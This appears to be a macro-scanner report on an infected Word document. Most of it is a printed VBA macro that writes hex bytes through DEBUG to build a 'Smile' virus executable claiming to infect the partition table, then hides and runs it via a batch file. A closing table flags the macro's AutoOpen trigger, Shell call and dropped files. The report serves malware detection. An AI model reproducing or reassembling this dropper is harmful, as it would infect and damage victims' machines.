Print #1, "E 0DC0 1E 61 CC 79 8F 31 E6 3C C7 88 73 8F 01 C6 3C 67"
Print #1, "E 0DD0 8C 71 8E 38 D3 1E 78 F0 1E 3C 3E 4D CF 99 E1 7C"
Print #1, "E 0DE0 7C 99 76 7E 1C C1 E6 3C 87 81 F2 3C 67 87 70 7C"
Print #1, "E 0DF0 1F 8C 70 EE 78 E3 B8 9F 8E 70 EE 39 91 E7 09 C7"
Print #1, "E 0E00 D9 86 64 6C 03 A3 F8 6E CF 88 61 C7 20 E7 3F 87"
Print #1, "E 0E10 88 F2 66 34 D9 B4 71 C6 70 E3 39 C7 04 C1 CC 73"
Print #1, "E 0E20 8E 23 0C DB 9C 76 5C CB 18 63 80 F1 3C 27 CC 39"
Print #1, "E 0E30 1F 24 C9 9D 13 E6 6C CD 9F 63 2E ED D9 33 27 CC"
Print #1, "E 0E40 1C 07 0C 78 1C 73 CE 7C 8E 33 B2 3C 39 9E 3E 63"
Print #1, "E 0E50 0C 99 D1 1C E2 8C 33 C3 18 F3 BC E6 D9 E3 90 F0"
Print #1, "E 0E60 9E 13 86 70 4F C8 F1 3F C6 E1 E7 91 E2 7E 4F 81"
Print #1, "E 0E70 F3 3C 4F 81 F0 78 1F 03 C0 F0 3E 0F C1 F0 78 1F"
Print #1, "E 0E80 03 E1 F0 3E 1F 03 E0 F0 3F 0F 03 E0 F0 3F 1F 07"
Print #1, "E 0E90 E1 F0 7E 3F 07 E1 F8 7E 1F 87 E1 DC 6E 1D E3 70"
Print #1, "E 0EA0 CF 1B 07 7C 6F 1C F1 BE 3C E3 64 4C F3 3C 47 98"
Print #1, "E 0EB0 E0 F8 3F 87 E3 F8 7E 1C 87 81 E0 F8 3F 1F 83 91"
Print #1, "E 0EC0 F0 7C 2F 0F E3 F0 7E 1F 83 E0 F8 3E 1F C6 F1 DC"
Print #1, "E 0ED0 3B 0F 31 E0 38 8F 11 C7 B9 F8 7E 1F 85 E0 F8 3E"
Print #1, "E 0EE0 3B 87 60 FC 3C 17 C5 C0 F8 3C 1F 31 C4 F1 D8 33"
Print #1, "E 0EF0 99 C3 8D 8C 8C 3E 47 66 F8 BE 3D C7 90 E2 3E 33"
Print #1, "E 0F00 81 E1 FC 3E 13 64 E6 31 8C 73 1C 03 A0 E0 3C 47"
Print #1, "E 0F10 83 E2 F8 9C 33 83 71 F8 3B 8F 89 C6 38 2E 1D C1"
Print #1, "E 0F20 F0 E6 3D C7 39 E6 38 D7 17 26 78 E6 39 C6 23 C6"
Print #1, "E 0F30 6C 8D 94 71 39 E2 39 C7 78 FE 0F 63 F8 46 C5 C8"
Print #1, "E 0F40 3B 1F E1 F8 BF 07 C3 E8 7E 1F 03 F0 FC 3D 8F E1"
Print #1, "E 0F50 CC 7F 0E 63 FC 73 8F E3 CC 77 8F 31 CE 3C C7 38"
Print #1, "E 0F60 79 8E 70 E3 8C 71 8F C7 D8 3C C7 21 F8 79 8F 01"
Print #1, "E 0F70 C6 39 C6 CC E3 9C E0 7E 1E 43 E3 38 3E 1D 8F 19"
Print #1, "E 0F80 C8 E6 1E 63 CC 71 0E 31 83 5C C5 CE 78 EE 11 C8"
Print #1, "E 0F90 79 07 19 C4 18 DE 07 00 70 62 3D 8E 63 FC 3F 0F"
Print #1, "E 0FA0 8C EC C6 73 46 4E E0 DC 33 86 70 4E 37 87 70 E6"
Print #1, "E 0FB0 38 FE 31 C3 98 7C 67 23 B6 71 85 E1 BC 0E 83 B6"
Print #1, "E 0FC0 3E 79 33 07 2C E3 19 DF 18 E4 4F C7 C0 7C 0F 00"
Print #1, "E 0FD0 E2 78 99 31 CA 1A 27 71 F0 BB 1F E1 F0 75 0C C8"
Print #1, "E 0FE0 E8 E6 33 27 8C F1 1D 19 C8 71 9B 99 3E 1E 03 A8"
Print #1, "E 0FF0 71 1E 01 C3 30 4C 7F 8E 63 1D AF 39 8E C3 F3 DC"
Print #1, "E 1000 18 8E 03 88 F8 1E 13 46 F0 7B 3B C7 78 E3 38 73"
Print #1, "E 1010 0F C7 F8 F8 1F 03 C1 D8 39 8E 71 CE 39 B1 B7 79"
Print #1, "E 1020 B9 03 F8 CE 0B 9C 73 81 9C 37 91 D8 5F 13 F1 BE"
Print #1, "E 1030 67 E3 F8 1F 8B F0 76 1F C1 D8 7F 07 71 7E 1D C7"
Print #1, "E 1040 F8 7F 0F E0 FC 3F C3 B8 FF 0C E3 FC 33 8E F0 CE"
Print #1, "E 1050 39 C3 98 73 0C E3 9C 73 8E 71 CE 38 C7 38 E3 1C"
Print #1, "E 1060 61 8C 79 C6 39 E7 1C E3 9C 73 8F 38 C7 0E 78 8F"
Print #1, "E 1070 86 78 4F 0E 78 DF 0F DE 33 E3 1D C1 FC 67 87 98"
Print #1, "E 1080 8E 0C E4 72 3B 98 CC E0 37 19 F1 9C 64 C7 39 B9"
Print #1, "E 1090 1C C7 CC 71 9F 18 C6 07 02 39 CF 0C 71 C6 38 F9"
Print #1, "E 10A0 C1 DC 73 07 03 E1 F0 1E D0 E2 1C 61 C0 38 C1 43"
Print #1, "E 10B0 33 31 8E CF 8C F0 8E 31 E3 9C 67 83 39 8E 63 E2"
Print #1, "E 10C0 3C 0F 80 F0 1E 07 91 F9 0E 01 E0 3D 83 F0 73 0E"
Print #1, "E 10D0 41 F8 79 07 A0 E6 3F C3 DC 3F 87 F0 9E 19 C3 18"
Print #1, "E 10E0 E7 18 63 9C 31 CE 73 87 39 C8 9C 67 30 71 8E 70"
Print #1, "E 10F0 C6 3B C3 18 E7 0E 71 9C 1B C4 70 E7 3D F1 DC 7F"
Print #1, "E 1100 86 71 DC 1D C7 37 7F 0F E1 FC 1F 87 F8 1F 0F E7"
Print #1, "E 1110 9C 67 0E E3 FC 33 98 3D 06 78 CF 03 F8 9E 07 F0"
Print #1, "E 1120 3E 43 E0 7C 0F E0 FC 8F C0 F1 1F 81 E2 3E 07 C0"
Print #1, "E 1130 FC 1F 81 F8 3F 07 F0 7C 0F C1 F8 3F 07 E0 FE 1F"
Print #1, "E 1140 C1 F8 3F 07 F0 FE 0F C1 FC 3F 83 F0 3F 07 E0 7E"
Print #1, "E 1150 1F C1 FC 3F 83 F8 BE 07 F1 7C 1F E3 FC 3F C3 F8"
Print #1, "E 1160 3F C7 F0 7D C7 D8 78 E3 0E 30 F8 0F 80 FC 1F C3"
Print #1, "E 1170 F8 67 03 F1 DC 07 C3 F8 7F 87 F0 7E 0F E0 FC 1F"
Print #1, "E 1180 81 F8 3F 07 F0 78 0F 80 F0 3F 0F E0 FE 1F C1 F8"
Print #1, "E 1190 1F 03 E1 F6 1F C3 DC 3F 83 F0 3F 83 E0 7E 07 E0"
Print #1, "E 11A0 FC 1F C3 FC 3E 07 F8 7C 0F B1 F8 0F 03 F0 FE 07"
Print #1, "E 11B0 80 F8 0F 01 F8 1E 07 C0 7C 0F 81 F2 3B 83 C0 74"
Print #1, "E 11C0 1E 03 E8 7E 07 E0 FE 07 C0 FC 67 03 98 F4 17 03"
Print #1, "E 11D0 E0 3C 07 C2 BC 07 81 FC 2F 07 B0 7E 0F E0 FC 19"
Print #1, "E 11E0 C2 F1 39 C7 70 70 0F 01 F8 1F 87 F0 FF 0F E1 F8"
Print #1, "E 11F0 1F 83 F8 7C 03 F0 7C 0F 81 F0 1F 03 E0 7D 07 A0"
Print #1, "E 1200 7E 0F C0 E6 1C E3 88 78 07 B0 F4 1E C1 F0 3D 07"
Print #1, "E 1210 B0 F6 0E 01 C8 1C 03 80 3C 07 86 78 4F 81 F8 7F"
Print #1, "E 1220 07 E6 78 C7 98 E1 0E 73 C0 39 C7 1C 73 07 19 FE"
Print #1, "E 1230 4E E7 3B DD C8 0F CC 9C 98 0E EC FC 88 8E EC CC"
Print #1, "E 1240 88 4C CC F9 90 19 93 72 64 76 6F 91 27 BF F9 13"
Print #1, "E 1250 F7 24 7F 98 13 FE 88 9F B0 07 FE 01 7F C0 1F FC"
Print #1, "E 1260 01 FF 80 1F E6 41 FE 00 7F D8 13 FE 01 7F 20 0F"
Print #1, "E 1270 F8 01 FF C0 1F F8 03 FE 00 FF C0 1F F8 01 FF 80"
Print #1, "E 1280 1F E0 07 FC 09 BE 60 0F EC 09 FF 00 9F B0 07 FB"
Print #1, "E 1290 02 7F 80 1F D8 0B FC 81 BF 90 0F FC 03 FF 80 3F"
Print #1, "E 12A0 E4 0D FE 00 FF F0 07 FE 01 BF C0 1F FC 01 FF 00"
Print #1, "E 12B0 7F F8 13 7F 81 3F E4 0F FE 00 3F E0 0D FE 22 37"
Print #1, "E 12C0 E4 49 FE 64 DF 7C C9 BF E0 19 B3 20 4F EC 89 FF"
Print #1, "E 12D0 C0 4F FE 00 FF C8 17 F9 20 9B 6C 82 66 4C C8 CC"
Print #1, "E 12E0 DE 04 A6 FB 13 20 1F EC 8C EC CC 6C CC 99 14 D9"
Print #1, "E 12F0 99 19 B3 20 76 F9 A6 DB 20 17 6C 92 6C C8 6F E6"
Print #1, "E 1300 46 EC C3 3F 24 47 C9 99 3B 24 DB B2 6E EC 82 5D"
Print #1, "E 1310 C2 66 F9 20 CF E4 42 7B 92 3B 33 26 99 32 DB 64"
Print #1, "E 1320 FB 99 9D 9A 64 63 36 6C C3 32 79 B6 D9 A6 7D 32"
Print #1, "E 1330 4F 36 49 B2 CC D6 6C 93 33 21 93 6C C8 9B B1 25"
Print #1, "E 1340 B3 66 03 ED 8C 9A 88 9B F6 44 FF EC 89 13 3F CC"
Print #1, "E 1350 99 BF 90 13 FE 40 4F FC 04 FF 80 3F F0 07 FF 13"
Print #1, "E 1360 77 E9 13 33 22 37 78 02 6E C9 3F DC 8B E6 62 7F"
Print #1, "E 1370 8C 66 F3 C9 9B D8 07 F3 13 7C CC 89 BE 03 F6 73"
Print #1, "E 1380 33 26 64 DB 60 3B 3E 44 9B C8 9F EC C9 B2 64 49"
Print #1, "E 1390 33 13 99 8C 9B 31 13 EC 83 7F F1 03 FC CD DE 19"
Print #1, "E 13A0 99 FF 91 3E 03 66 4C D9 1F CC 1F 99 BF 70 3F B1"
Print #1, "E 13B0 BB CC 4C 77 70 1D C4 1B F3 26 CC C7 33 36 4C 9D"
Print #1, "E 13C0 E6 4D D9 90 3F E4 4F 64 B2 64 CD 8F EC 19 93 78"
Print #1, "E 13D0 81 F8 03 FC 92 DC 84 D8 9D D9 B7 33 23 93 CD 24"
Print #1, "E 13E0 D8 19 9B 32 65 93 93 26 C4 69 32 47 C7 1C D8 73"
Print #1, "E 13F0 30 CD B3 26 D8 3C B3 61 E6 6D 93 6E 26 79 30 E3"
Print #1, "E 1400 40 CC C6 07 0E 6C 4C B8 F0 C3 EF 86 73 37 89 0F"
Print #1, "E 1410 B8 26 6C 0C 19 CC 68 F3 61 93 C7 27 98 36 7D 31"
Print #1, "E 1420 F3 B3 66 CD CC 9B 36 7E 59 3C D9 66 C3 27 83 4F"
Print #1, "E 1430 07 9C 26 79 30 70 D9 E1 9F E3 13 0C 96 43 36 4D"
Print #1, "E 1440 BC 99 3C FA 6C 9B 6C 3D C8 86 4F 2E C0 DD 03 FF"
Print #1, "E 1450 11 F0 FF F0 3E 0D FE 13 B2 DF 80 CC 27 D1 2C 99"
Print #1, "E 1460 E1 B4 1D E1 3C 3F C2 78 3F 01 F8 BC 0F 71 74 1B"
Print #1, "E 1470 07 33 CC 73 1E E6 3B 85 F1 3C 07 91 EC CE C3 B8"
Print #1, "E 1480 DE 03 89 F2 3C 8C 63 E4 F1 9F 17 44 D8 F9 0F 11"
Print #1, "E 1490 86 C7 41 7E 3F 07 D8 FE 1F E3 E8 3B 8F E2 FE 37"
Print #1, "E 14A0 87 F1 BC 65 C7 39 87 C6 70 9F 1F C3 F8 9E 47 F9"
Print #1, "E 14B0 C7 91 F0 F8 0F 67 CC 13 8D C3 38 8F 81 FC 07 A7"
Print #1, "E 14C0 F1 3D 8C E1 9C 03 88 72 1E 31 CC F0 76 30 C3 1E"
Print #1, "E 14D0 47 C0 79 17 01 F8 C6 30 EC 31 9C F1 0C 8F 82 78"
Print #1, "E 14E0 FE 0F E2 B8 FB 13 D9 FD 27 9B 62 2D 90 CC 37 9B"
Print #1, "E 14F0 71 9F 27 61 F2 BB 06 F4 C3 3C 66 D9 83 26 33 81"
Print #1, "E 1500 C4 C6 0C E0 C6 7D 64 93 C9 35 9F 63 3C 1B 61 BC"
Print #1, "E 1510 8E 37 80 F1 CC C6 6D 82 19 E5 98 79 93 31 8C 99"
Print #1, "E 1520 24 C2 73 18 C6 79 27 98 F3 37 13 C6 7E 19 C9 EC"
Print #1, "E 1530 F7 19 C4 78 8D 24 F3 2E 31 98 F2 0C C3 C7 3D 8F"
Print #1, "E 1540 88 D9 8E 67 38 CD 81 90 19 87 B9 9C 3F 98 CA 3B"
Print #1, "E 1550 87 37 89 E6 7A 6C DC 3D B8 CE 66 3E 66 1F 8E 99"
Print #1, "E 1560 E7 D3 CE E1 E7 97 69 F6 C7 F1 F9 8F C3 F6 9F 93"
Print #1, "E 1570 DF 8E D1 FB 8F E3 9D 9F 63 CF 19 C7 18 7E 8F E6"
Print #1, "E 1580 78 9E 71 DA 3F C7 F0 ED 8E 83 9F 39 E6 78 EE 3F"
Print #1, "E 1590 E3 98 E7 8E 73 1E 73 8C F9 E6 75 E3 9C FB 8C E3"
Print #1, "E 15A0 BC 77 98 F1 1A 60 CE 61 87 3D C7 9F 39 67 BC 67"
Print #1, "E 15B0 18 F1 F8 73 38 E6 06 E3 BC 73 CC 7C 1F 8D C1 D6"
Print #1, "E 15C0 73 C6 77 87 31 8E 3C C7 30 73 1C E3 9C 71 8C 71"
Print #1, "E 15D0 C6 18 C6 38 73 1A 21 CD CC 83 33 1F 0C CE 3C 33"
Print #1, "E 15E0 98 31 CE 63 C7 33 8C CD 8E 3C 33 98 E0 E4 E3 99"
Print #1, "E 15F0 31 C6 C6 E3 33 8F 0E 86 36 76 38 98 FC 63 E3 B9"
Print #1, "E 1600 CF 8F C6 67 33 8E 9C 9F 1C E0 71 B3 8C E4 CC 27"
Print #1, "E 1610 47 71 9C 64 E4 E1 A3 89 CC 9E 67 31 73 0C C1 CC"
Print #1, "E 1620 C7 8B CC CC 33 A3 1A 38 CC E1 C6 1B D3 78 FF 2E"
Print #1, "E 1630 E1 EF 1F 87 5C 6F 1B 93 9C 72 E5 93 8E 31 CC 67"
Print #1, "E 1640 8E 39 9C 98 EC 1C 83 B3 71 C6 20 EE 35 0F 1D F1"
Print #1, "E 1650 78 F7 3E 35 19 9E 30 0B 99 36 0F 1C E6 1C F1 DC"
Print #1, "E 1660 F1 CE E1 AF 1B 86 66 67 18 F9 DC 66 CC F3 33 33"
Print #1, "E 1670 8C CC A6 33 67 39 99 93 67 68 CE 79 CC 63 CC 7B"
Print #1, "E 1680 3C 19 26 33 62 DA 7B 16 46 1C DB 2C 93 4C C0 E3"
Print #1, "E 1690 C8 31 CD A4 DB 9A 66 17 36 4E 3C DA 64 D8 D2 64"
Print #1, "E 16A0 F1 E4 E7 C9 A7 39 8C 36 0F CE 33 2F 23 88 C9 99"
Print #1, "E 16B0 23 8C 73 86 3A 73 66 78 EC CC 99 A3 78 C6 33 98"
Print #1, "E 16C0 36 CC E1 93 65 C9 33 0D C1 B2 3E 4D C3 34 CF CA"
Print #1, "E 16D0 CC 78 C1 8E 6C D1 E3 1C 61 93 13 98 38 E3 8E 5C"
Print #1, "E 16E0 F0 C7 1E 30 F1 CF 19 6C 9D 6D C7 9B 1C 61 9B 27"
Print #1, "E 16F0 1C F1 CD 1E 18 E2 C7 1C 31 E1 86 38 E5 9A 6C 61"
Print #1, "E 1700 CF 3E 38 E7 0E 7C C8 36 4C E3 9C 38 E3 8F 0C 68"
Print #1, "E 1710 E7 1C B3 67 3C F9 E3 87 1C 78 E3 06 18 73 8B 38"
Print #1, "E 1720 38 C7 86 38 73 C7 3C 99 CC DE 6C F1 C3 1E 3C 31"
Print #1, "E 1730 C7 8E 18 70 E3 86 73 33 9B 1C 71 CD 86 78 F2 63"
Print #1, "E 1740 8F 1E 71 9A 2C F9 E7 96 7C 71 F1 9E 19 62 CE 5C"
Print #1, "E 1750 B3 E7 8F 38 E3 A6 0C 20 C7 30 69 93 19 9C 6C CC"
Print #1, "E 1760 1C 33 27 C6 99 B0 E0 FC D8 67 1E 47 CD 83 01 CC"
Print #1, "E 1770 D9 91 72 3C 3E 7D 3C 1F 1E 4C 9E 16 6C D9 19 B0"
Print #1, "E 1780 CC 9E 37 89 8C DC 68 E2 CC 69 F1 CC C9 E3 CC C9"
Print #1, "E 1790 E3 8C CB C3 9C CF C7 1C C7 C3 8C C7 C3 9C C7 E7"
Print #1, "E 17A0 8C C7 C3 9C CF CE 79 9F 26 39 99 8E 79 99 9C F1"
Print #1, "E 17B0 91 8C F1 B3 99 F1 B2 CC D1 83 99 E3 26 D9 CD 97"
Print #1, "E 17C0 1C C6 67 3B 19 32 4D 99 2E 79 8C 27 31 8C 33 32"
Print #1, "E 17D0 66 4C 73 C6 0C 63 9C 63 66 93 F8 CD 9C 77 8E 9C"
Print #1, "E 17E0 7E 4C 0C 6E 4D 98 EC C6 38 66 66 78 DC F3 4C CE"
Print #1, "E 17F0 64 98 C6 31 99 98 3C DF 1C BD 37 19 C6 0F 3C 72"
Print #1, "E 1800 0E 19 33 CF 32 E3 13 24 43 DF 66 C7 5C 66 83 04"
Print #1, "E 1810 64 73 7E EC D6 30 6C 4D BF CC 06 7C FD 98 20 FF"
Print #1, "E 1820 88 4E F3 80 7F F0 3B FF 00 3F FC 0F FB C0 1F FE"
Print #1, "E 1830 03 FF C0 1F FE 03 FF C0 3F FC 0F 7F 00 7F F0 03"
Print #1, "E 1840 10 07 FF F0 20 0F FB FF FF FF FF FF FF FF FF FF"
Print #1, "E 1850 FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF"
Print #1, "E 1860 FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF"
Print #1, "E 1870 FF FF FF FF FF FF 00 00 00 00 00 00 00 00 00 00"
Print #1, "E 1880 4D 5A 73 00 01 00 00 00 00 00 80 00 FF FF 08 00"
Print #1, "E 1890 FE 07 00 00 1C 00 00 00 1C 00 00 00 B4 09 0E 1F"
Print #1, "E 18A0 BA 2A 00 CD 21 B8 00 4C CD 21 0D 0A 57 41 52 4E"
Print #1, "E 18B0 49 4E 47 3A 0D 0A 0D 0A 53 6D 69 6C 65 20 76 69"
Print #1, "E 18C0 72 75 73 20 68 61 73 20 6E 6F 77 20 69 6E 66 65"
Print #1, "E 18D0 63 74 65 64 20 74 68 65 20 70 61 72 74 69 74 69"
Print #1, "E 18E0 6F 6E 20 74 61 62 6C 65 20 21 21 21 21 21 0D 0A"
Print #1, "E 18F0 0D 0A 24"
Print #1, "RCX"
Print #1, "17F3"
Print #1, "W"
Print #1, "Q"
Close #1
c$ = "SMILE.COM"

Open b$ + "power.bat" For Output As #1
Print #1, "@echo off"
Print #1, "debug <" + b$ + "power.scr > nul"
Print #1, "@echo off"
Print #1, "attrib" + b$ + "power.* +h"
Print #1, "@echo off"
Print #1, b$ + c$
Close #1

Shell b$ + "power.bat", 0

SetProfileString "Installed", "Yes", c$
Else
Goto Finish
End If

Finish:
End Sub
==============================================================================
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|Suspicious|Open                |May open a file                              |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|Shell               |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |power.scr           |Executable file name                         |
|IOC       |power.bat           |Executable file name                         |
|Base64    |"{e                 |Intl                                         |
|String    |                    |                                             |
+----------+--------------------+---------------------------------------------+

